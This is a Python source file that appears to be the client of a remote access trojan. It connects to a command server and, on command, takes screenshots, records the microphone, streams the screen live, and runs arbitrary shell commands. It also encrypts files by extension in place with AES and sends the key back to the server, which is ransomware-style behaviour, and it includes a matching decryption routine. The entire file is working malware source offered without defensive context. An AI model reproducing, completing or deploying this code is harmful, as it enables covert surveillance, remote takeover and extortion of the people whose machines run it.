import socket
import json
import base64
import io,os
import subprocess
import time
import cv2
import numpy as np
import sounddevice as sd
import soundfile as sf
import pyautogui
from datetime import datetime
import ast # to return the key to byte

SERVER_HOST = "127.0.0.1"   
SERVER_PORT = 5001

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import os

key = os.urandom(32)
iv = os.urandom(16)

def encrypt(sock, input_file):
    with open(input_file, 'rb') as f:
        data = f.read()

    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    with open(input_file, 'wb') as f:
        f.write(iv + encrypted_data)
    
    # Convert bytes to base64 string for JSON serialization
    key_base64 = base64.b64encode(key).decode('utf-8')
    sendkey = {"command": "key", "result": "ok", "details": key_base64}
    send_json(sock, sendkey)
    
    details = f'the {input_file} encrypted with key to {input_file}.enc'
    result = {"command": "encryption", "status": "ok", "details": details}
    send_json(sock, result)

def encrypt_file(sock,pathfile,extensions):
     os.chdir(pathfile)
     for root, dirs, files in os.walk("."):
        for file in files:
            for ext in extensions:
                if file.endswith(str(ext)):
                    full_path = os.path.join(root, file)
                    encrypt(sock,full_path)

    
# encrypt_file("secret_data.png", "image.enc")

def decrypt(sock, input_file, key):
    # Convert base64 string back to bytes
    try:
        key = base64.b64decode(key)
    except:
        # If it's already bytes or in another format, try hex
        try:
            key = bytes.fromhex(key)
        except:
            send_json(sock, {"command": "decrypt", "status": "error", "details": "Invalid key format"})
            return

    with open(input_file, 'rb') as f:
        iv = f.read(16)
        encrypted_data = f.read()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(padded_data) + unpadder.finalize()
    
    input_fil = input_file + ".dec"  # Better extension for decrypted file
    with open(input_fil, 'wb') as f:
        f.write(data)
    
    details = f'the {input_file} decrypted to {input_fil}'
    result = {"command": "decrypt", "status": "ok", "details": details}
    send_json(sock, result)
    
# decrypt_file("image.enc", "decrypted_image.png")

def decrypt_file(sock, pathfile, extensions, key):
    os.chdir(pathfile)
    for root, dirs, files in os.walk("."):
        for file in files:
            for ext in extensions:
                # Add dot if not present and check
                if not ext.startswith("."):
                    ext = "." + ext
                if file.endswith(ext):
                    full_path = os.path.join(root, file)
                    decrypt(sock, full_path, key)
                    
def send_json(sock, obj):
    """Send JSON object with 4-byte big-endian length prefix."""
    data = json.dumps(obj).encode('utf-8')
    sock.sendall(len(data).to_bytes(4, 'big'))
    sock.sendall(data)

def recv_all(sock, n):
    """Receive exactly n bytes or return None on EOF."""
    data = b''
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def handle_screenshot():
    """Capture a screenshot and return base64 PNG."""
    img = pyautogui.screenshot()
    buf = io.BytesIO()
    img.save(buf, format='PNG')
    encoded = base64.b64encode(buf.getvalue()).decode('utf-8')
    return {"command": "screenshot", "status": "ok", "data_base64": encoded}

def handle_record_audio(duration=5, samplerate=44100):
    """Record microphone input and return as base64 WAV."""
    # send_json({"command":"message","note":"Recording audio for {duration}s ..."})
    audio = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=1, dtype='int16')
    sd.wait()
    buf = io.BytesIO()
    sf.write(buf, audio, samplerate, format='WAV')
    encoded = base64.b64encode(buf.getvalue()).decode('utf-8')
    return {"command": "record_audio", "status": "ok", "audio_base64": encoded}

def handle_live_screen(sock, duration=5):
    """Stream live screen frames to server."""
    send_json(sock, {"command": "live_screen", "status": "ok", "note": "stream starting"})
    end_time = time.time() + duration
    while time.time() < end_time:
        frame = np.array(pyautogui.screenshot())
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        _, encoded = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
        data = encoded.tobytes()
        sock.sendall(len(data).to_bytes(4, 'big'))
        sock.sendall(data)
        time.sleep(0.1)
    send_json(sock,{"command":"message","status": "ok","note":"finish live screen"})

def handle_powershell(sock, cmd):
    current_path = os.getcwd()
    if cmd.startswith("cd "):
        try:
            new_dir = cmd[3:].strip()
            if not new_dir:
                new_dir = os.path.expanduser("~")
            os.chdir(new_dir)
            current_path = os.getcwd()
            result = f"Changed directory to: {current_path}\n"
        except Exception as e:
            result = f"Error changing directory: {e}\n"
    elif cmd.lower() in ["exit", "quit", "logout"]:
        result = "Exited remote PowerShell session.\n"
    # elif cmd.startswith("encrypt"):
        
    # elif cmd.startswith("decrypt"):
    #     originalfile=cmd[3:]
    else:
        try:
            process = subprocess.run(
                cmd,
                shell=True,
                cwd=current_path,
                text=True,
                capture_output=True
            )
            result = process.stdout if process.stdout else process.stderr
        except Exception as e:
            result = f"Error executing command: {e}\n"

    # Send result back to server
    resp = {
        "command": "powershell",
        "status": "ok",
        "output": result,
        "cwd": os.getcwd()
    }
    send_json(sock, resp)

def client_loop():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # send_json({"command":"message","status": "ok","note":"try Connecting to {SERVER_HOST}:{SERVER_PORT} ..."})
        sock.connect((SERVER_HOST, SERVER_PORT))
        while True:
            hdr = recv_all(sock, 4)
            if not hdr:
                break
            length = int.from_bytes(hdr, 'big')
            data = recv_all(sock, length)
            if not data:
                break

            try:
                cmd = json.loads(data.decode('utf-8'))
            except Exception as e:
                # send_json(sock, {"command":"message","status": "ok","note":"Bad JSON: {e}"})
                print(f"Bad JSON: {e}")
                continue

            command = cmd.get("command")
            send_json(sock, {"command":"message","status": "ok","note": str(command)})
            try:
                if command == "screenshot":
                    resp = handle_screenshot()
                    send_json(sock, resp)

                elif command == "record_audio":
                    dur = int(cmd.get("duration", 5))
                    resp = handle_record_audio(dur)
                    send_json(sock, resp)

                elif command == "live_screen":
                    dur = int(cmd.get("duration", 5))
                    handle_live_screen(sock, dur)
                elif command == "powershell":
                    cmdline = cmd.get("cmd", "")
                    handle_powershell(sock, cmdline)
                elif command == "encrypt":
                    print("PPPPPPPPPPPP")
                    path = cmd.get("path", "")
                    extensions=cmd.get("extensions","")
                    encrypt_file(sock,path,extensions)
                elif command == "decrypt":
                    pathfolder = cmd.get("path", "")
                    extensions = cmd.get("extensions", "")
                    key = cmd.get("key", "")
                    decrypt_file(sock,pathfolder,extensions,key)
                else:
                    send_json(sock, {"command": command, "status": "unknown_command"})

            except Exception as e:
                send_json(sock, {"command": command, "status": f"error: {e}"})

    except Exception as e:
        send_json(sock, {"command":"message","status": "ok","note":"Connection failed: {e}"})
    finally:
        sock.close()
        send_json(sock, {"command":"message","status": "ok","note":"Disconnected."})
if __name__ == "__main__":
    client_loop()
